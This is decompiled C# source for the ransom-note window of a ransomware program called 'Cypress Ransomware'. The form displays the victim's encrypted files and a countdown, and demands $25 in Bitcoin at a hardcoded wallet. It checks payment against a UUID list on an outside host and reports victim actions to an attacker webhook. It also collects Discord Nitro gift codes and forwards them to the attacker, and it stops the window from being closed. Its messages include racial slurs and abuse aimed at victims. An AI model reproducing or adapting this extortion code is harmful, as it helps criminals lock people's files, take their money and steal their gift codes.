using System;
using System.ComponentModel;
using System.Drawing;
using System.Net;
using System.Threading;
using System.Timers;
using System.Windows.Forms;

namespace NitroRansomware;

public class Form1 : Form
{
	private System.Timers.Timer t;

	private int h = 24;

	private int m;

	private int s;

	private int h2 = 12;

	private int m2;

	private int s2;

	private Webhook ww = new Webhook(Program.WEBHOOK);

	private IContainer components;

	private BackgroundWorker backgroundWorker1;

	private Label label1;

	private Label label2;

	private Label label3;

	private Panel panel1;

	private Panel panel2;

	private Label label4;

	private Button button1;

	private Label label5;

	private TextBox textBox3;

	private TextBox textBox2;

	private Label label9;

	private TextBox textBox5;

	private Panel panel3;

	private Label label10;

	private Label label8;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		t = new System.Timers.Timer();
		t.Interval = 1000.0;
		t.Elapsed += OnTimeEvent;
		t.Start();
		string identifier = User.GetIdentifier();
		((Control)textBox5).set_Text("");
		((Control)textBox3).set_Text(identifier);
		foreach (string item in Crypto.encryptedFileLog)
		{
			TextBox obj = textBox5;
			((Control)obj).set_Text(((Control)obj).get_Text() + "Encrypted: " + item + "\r\n");
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Invalid comparison between Unknown and I4
		((CancelEventArgs)(object)e).Cancel = (int)e.get_CloseReason() == 3;
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		string identifier = User.GetIdentifier();
		if (new WebClient
		{
			Proxy = null
		}.DownloadString("https://cypressuuidhost.000webhostapp.com/uuids.txt").Contains(identifier))
		{
			ww.Send("```User has made payment.. Decrypting files.```");
			MessageBox.Show("Payment Completed! Decrypting files...", "Cypress Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)64);
			Crypto.inPassword = Crypto.fPassword;
			((Control)textBox5).set_Text("Decrypting files.. \r\nThis may take a while. Loading..");
			Cursor.set_Current(Cursors.get_WaitCursor());
			Program.DecryptAll();
			Cursor.set_Current(Cursors.get_Default());
			MessageBox.Show("Task complete. If there are files that have not been decrypted, make sure you turn off all antivirus and Windows Defender, then try decrypting again. \r\nIf it doesn't work, delete all Desktop.ini.cypress files that you see and try again.", "Cypress Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)64);
			Program.RemoveStart();
		}
		else
		{
			Thread.Sleep(2700);
			MessageBox.Show("Payment Not Completed! If you just now paid, please allow up to 12 hours to process payment", "Cypress Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private void button2_Click(object sender, EventArgs e)
	{
	}

	private void textBox5_TextChanged(object sender, EventArgs e)
	{
	}

	private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
	{
	}

	private void label7_Click(object sender, EventArgs e)
	{
	}

	private void label8_Click(object sender, EventArgs e)
	{
	}

	private void label6_Click(object sender, EventArgs e)
	{
	}

	private void label5_Click(object sender, EventArgs e)
	{
	}

	private void button4_Click(object sender, EventArgs e)
	{
		Clipboard.SetText(((Control)textBox2).get_Text());
	}

	private void button3_Click(object sender, EventArgs e)
	{
	}

	private void label10_Click(object sender, EventArgs e)
	{
	}

	private bool NitroValid()
	{
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f1: Unknown result type (might be due to invalid IL or missing references)
		Webhook webhook = new Webhook(Program.WEBHOOK);
		string text = ((Control)textBox2).get_Text();
		string empty = string.Empty;
		Console.WriteLine(text);
		if (text.Contains("discord.gift/"))
		{
			if (text.Contains("https://"))
			{
				int num = text.IndexOf("/");
				empty = text.Substring(num + 15);
				Console.WriteLine(empty);
			}
			else
			{
				int num2 = text.IndexOf("/");
				empty = text.Substring(num2 + 1);
				MessageBox.Show("Checking gift validity.. .", "Cypress Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			if (Nitro.Check(empty))
			{
				webhook.Send("**Valid nitro code was received**");
				webhook.Send(text);
				MessageBox.Show("Success! Valid nitro code was sent. Your decryption key is now available. You may start decrypting your files now.", "Cypress Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)64);
				return true;
			}
			webhook.Send("```User sent invalid discord gift Link.```");
			MessageBox.Show("Invalid Nitro", "Cypress Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else
		{
			webhook.Send("```User sent invalid discord gift Link.```");
			MessageBox.Show("Please enter a Discord nitro gift in this format discord.gift/code here", "Cypress Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		return false;
	}

	private void OnTimeEvent(object sender, ElapsedEventArgs e)
	{
		Webhook ww = new Webhook(Program.WEBHOOK);
		((Control)this).Invoke((Delegate)(Action)delegate
		{
			//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
			if (s < 1)
			{
				s = 59;
				if (m == 0)
				{
					m = 59;
					if (h != 0)
					{
						h--;
					}
				}
				else
				{
					m--;
				}
			}
			else
			{
				s--;
			}
			if (s == 0 && m == 0 && h == 0)
			{
				ww.Send("```User ran out of time. LMAO L NIGGA!```");
				MessageBox.Show("Lmao you ran out of time dumbfuck, rip yo files nigga", "Cypress Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)16);
				Application.Exit();
			}
			((Control)label10).set_Text($"{h.ToString().PadLeft(2, '0')}:{m.ToString().PadLeft(2, '0')}:{s.ToString().PadLeft(2, '0')}");
		});
	}

	private void OnTimeEvent2(object sender, ElapsedEventArgs e)
	{
		Webhook ww = new Webhook(Program.WEBHOOK);
		((Control)this).Invoke((Delegate)(Action)delegate
		{
			if (s2 < 1)
			{
				s2 = 59;
				if (m2 == 0)
				{
					m2 = 59;
					if (h2 != 0)
					{
						h2--;
					}
				}
				else
				{
					m2--;
				}
			}
			else
			{
				s2--;
			}
			if (s2 == 0 && m2 == 0 && h2 == 0)
			{
				ww.Send("```Decryption Key Release Timer Over... Releasing key...```");
				((Control)textBox3).set_Text(Crypto.fPassword);
			}
			((Control)label10).set_Text($"{h.ToString().PadLeft(2, '0')}:{m.ToString().PadLeft(2, '0')}:{s.ToString().PadLeft(2, '0')}");
		});
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_0112: Unknown result type (might be due to invalid IL or missing references)
		//IL_011c: Expected O, but got Unknown
		//IL_01a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ac: Expected O, but got Unknown
		//IL_0232: Unknown result type (might be due to invalid IL or missing references)
		//IL_023c: Expected O, but got Unknown
		//IL_03b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ba: Expected O, but got Unknown
		//IL_04de: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e8: Expected O, but got Unknown
		//IL_06bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_06c9: Expected O, but got Unknown
		//IL_0769: Unknown result type (might be due to invalid IL or missing references)
		//IL_0773: Expected O, but got Unknown
		//IL_08a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_08b2: Expected O, but got Unknown
		//IL_0950: Unknown result type (might be due to invalid IL or missing references)
		//IL_095a: Expected O, but got Unknown
		//IL_0b2c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b36: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		backgroundWorker1 = new BackgroundWorker();
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		panel1 = new Panel();
		panel2 = new Panel();
		label4 = new Label();
		button1 = new Button();
		label5 = new Label();
		textBox3 = new TextBox();
		textBox2 = new TextBox();
		label9 = new Label();
		textBox5 = new TextBox();
		panel3 = new Panel();
		label10 = new Label();
		label8 = new Label();
		((Control)panel2).SuspendLayout();
		((Control)panel3).SuspendLayout();
		((Control)this).SuspendLayout();
		backgroundWorker1.DoWork += backgroundWorker1_DoWork;
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 21.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.Red);
		((Control)label1).set_Location(new Point(54, 10));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(520, 33));
		((Control)label1).set_TabIndex(2);
		((Control)label1).set_Text(" Oh no! Your files have been encrypted\r\n");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Segoe UI", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(SystemColors.Control);
		((Control)label2).set_Location(new Point(553, 96));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(45, 25));
		((Control)label2).set_TabIndex(5);
		((Control)label2).set_Text("Info");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Segoe UI", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(SystemColors.Control);
		((Control)label3).set_Location(new Point(127, 96));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(147, 25));
		((Control)label3).set_TabIndex(6);
		((Control)label3).set_Text("Time Remaining");
		((Control)panel1).set_BackColor(Color.FromArgb(35, 39, 42));
		((Control)panel1).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)panel1).set_Location(new Point(-1, -4));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(807, 32));
		((Control)panel1).set_TabIndex(4);
		((Control)panel2).set_BackColor(Color.FromArgb(35, 39, 42));
		((Control)panel2).get_Controls().Add((Control)(object)label1);
		((Control)panel2).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)panel2).set_Location(new Point(87, -1));
		((Control)panel2).set_Name("panel2");
		((Control)panel2).set_Size(new Size(613, 67));
		((Control)panel2).set_TabIndex(7);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Segoe UI", 8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(SystemColors.Control);
		((Control)label4).set_Location(new Point(84, 463));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(244, 13));
		((Control)label4).set_TabIndex(9);
		((Control)label4).set_Text("Send $25 USD worth of Bitcoin to this address");
		((Control)button1).set_BackColor(SystemColors.ButtonHighlight);
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_Location(new Point(282, 479));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(10);
		((Control)button1).set_Text("Check");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Segoe UI", 8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(SystemColors.Control);
		((Control)label5).set_Location(new Point(108, 529));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(98, 13));
		((Control)label5).set_TabIndex(11);
		((Control)label5).set_Text("Your Unique ID is:");
		((Control)label5).add_Click((EventHandler)label5_Click);
		((Control)textBox3).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)textBox3).set_BorderStyle((BorderStyle)1);
		((Control)textBox3).set_ForeColor(SystemColors.Window);
		((Control)textBox3).set_Location(new Point(35, 545));
		((Control)textBox3).set_Name("textBox3");
		((TextBoxBase)textBox3).set_ReadOnly(true);
		((Control)textBox3).set_Size(new Size(241, 20));
		((Control)textBox3).set_TabIndex(12);
		((Control)textBox3).set_TabStop(false);
		((Control)textBox2).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)textBox2).set_BorderStyle((BorderStyle)1);
		((Control)textBox2).set_ForeColor(SystemColors.Window);
		((Control)textBox2).set_Location(new Point(35, 482));
		((Control)textBox2).set_Name("textBox2");
		((TextBoxBase)textBox2).set_ReadOnly(true);
		((Control)textBox2).set_Size(new Size(241, 20));
		((Control)textBox2).set_TabIndex(8);
		((Control)textBox2).set_TabStop(false);
		((Control)textBox2).set_Text("bc1qeldjepu9e597965k3qdphv67uypyxqxv0n6lxa\r\n");
		((Control)label9).set_AutoSize(true);
		((Control)label9).set_Font(new Font("Segoe UI", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label9).set_ForeColor(SystemColors.Control);
		((Control)label9).set_Location(new Point(174, 329));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(32, 19));
		((Control)label9).set_TabIndex(19);
		((Control)label9).set_Text("Log");
		((Control)textBox5).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)textBox5).set_BorderStyle((BorderStyle)0);
		((Control)textBox5).set_Font(new Font("Segoe UI", 7.2f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox5).set_ForeColor(SystemColors.MenuBar);
		((Control)textBox5).set_Location(new Point(35, 364));
		((TextBoxBase)textBox5).set_Multiline(true);
		((Control)textBox5).set_Name("textBox5");
		((TextBoxBase)textBox5).set_ReadOnly(true);
		textBox5.set_ScrollBars((ScrollBars)2);
		((Control)textBox5).set_Size(new Size(347, 59));
		((Control)textBox5).set_TabIndex(20);
		((Control)textBox5).set_TabStop(false);
		((Control)textBox5).add_TextChanged((EventHandler)textBox5_TextChanged);
		((Control)panel3).set_BackColor(Color.Crimson);
		((Control)panel3).get_Controls().Add((Control)(object)label10);
		((Control)panel3).set_Location(new Point(35, 134));
		((Control)panel3).set_Name("panel3");
		((Control)panel3).set_Size(new Size(347, 178));
		((Control)panel3).set_TabIndex(21);
		((Control)label10).set_AutoSize(true);
		((Control)label10).set_Font(new Font("Microsoft Sans Serif", 50f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label10).set_ForeColor(SystemColors.ControlLightLight);
		((Control)label10).set_Location(new Point(23, 47));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(293, 76));
		((Control)label10).set_TabIndex(22);
		((Control)label10).set_Text("00:00:00");
		((Control)label10).add_Click((EventHandler)label10_Click);
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Font(new Font("Arial Black", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label8).set_ForeColor(Color.White);
		((Control)label8).set_Location(new Point(388, 134));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(415, 391));
		((Control)label8).set_TabIndex(22);
		((Control)label8).set_Text(componentResourceManager.GetString("label8.Text"));
		((Control)label8).add_Click((EventHandler)label8_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(44, 47, 51));
		((Form)this).set_ClientSize(new Size(800, 600));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)label8);
		((Control)this).get_Controls().Add((Control)(object)panel3);
		((Control)this).get_Controls().Add((Control)(object)textBox5);
		((Control)this).get_Controls().Add((Control)(object)label9);
		((Control)this).get_Controls().Add((Control)(object)textBox3);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)panel2);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Control)this).set_ForeColor(SystemColors.ControlText);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)panel2).ResumeLayout(false);
		((Control)panel2).PerformLayout();
		((Control)panel3).ResumeLayout(false);
		((Control)panel3).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
